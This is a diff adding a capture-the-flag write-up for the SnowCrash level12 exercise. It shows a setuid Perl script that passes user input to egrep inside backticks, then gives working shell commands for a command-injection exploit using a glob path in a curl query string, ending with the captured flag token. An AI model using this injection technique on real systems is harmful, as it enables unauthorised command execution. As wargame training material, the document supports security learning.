@@ -1,0 +1,33 @@
+level12@SnowCrash:~$ ls -l
+total 4
+-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
+
+the file is owned by the flag12 group
+
+#!/usr/bin/env perl
+# localhost:4646
+we supose that we have a service running in the localhost on port 4646
+so >> level12@SnowCrash:~$ curl localhost:4646
+..
+
+The most importanat function here is the f function
+it's get the first arg [x] and do actions like uppercase and del all after space
+
+$xx = $_[0];
+$xx =~ tr/a-z/A-Z/;
+$xx =~ s/\s.*//;
+@output = `egrep "^$xx" /tmp/xd 2>&1`;
+
+let's exploite the egrep expression to execute getflag
+
+
+level12@SnowCrash:~$ echo "getflag > /tmp/bingo" > /tmp/T
+
+level12@SnowCrash:~$ chmod +x /tmp/T
+
+level12@SnowCrash:~$ ls -l /tmp/T
+
+level12@SnowCrash:~$ curl "localhost:4646?x=\`/*/T\`"
+
+level12@SnowCrash:~$ cat /tmp/bingo
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
